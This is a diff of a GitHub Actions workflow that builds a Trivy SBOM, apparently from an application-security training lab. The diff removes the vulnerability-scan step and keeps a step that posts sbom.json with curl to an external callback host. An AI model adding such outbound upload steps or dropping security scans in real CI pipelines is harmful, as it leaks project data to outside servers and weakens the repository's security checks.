@@ -6,7 +6,7 @@ on:
   pull_request:
 
 jobs:
-  trivy-sbom:
+  Cyclone-sbom:
     runs-on: ubuntu-latest
 
     steps:
@@ -19,12 +19,7 @@ jobs:
       - name: Generate SBOM
         run: |
           docker run --rm -v ${{ github.workspace }}:/project \
-            ghcr.io/aquasecurity/trivy fs --format cyclonedx --output /project/sbom.json /project
-
-      - name: Scan SBOM for vulnerabilities
-        run: |
-          docker run --rm -v ${{ github.workspace }}:/project \
-            ghcr.io/aquasecurity/trivy sbom --severity HIGH,CRITICAL --format table /project/sbom.json > results.json
+            ghcr.io/aquasecurity/trivy fs --format cyclonedx-npm --output /project/sbom.json /project
 
       - name: Upload SBOM and Scan Report
         uses: actions/upload-artifact@v4
@@ -32,8 +27,7 @@ jobs:
           name: trivy-sbom-and-report
           path: |
             sbom.json
-            results.json
-
+            
       - name: Send Trivy report to external server
         run: |
-          curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json" http://8sqw7awk4rs80kginm65x.appsecengineer.training:8880/callback
+          curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@sbom.json" http://1cj94e4m3tzu68q7db3j1.appsecengineer.training:8880/callback
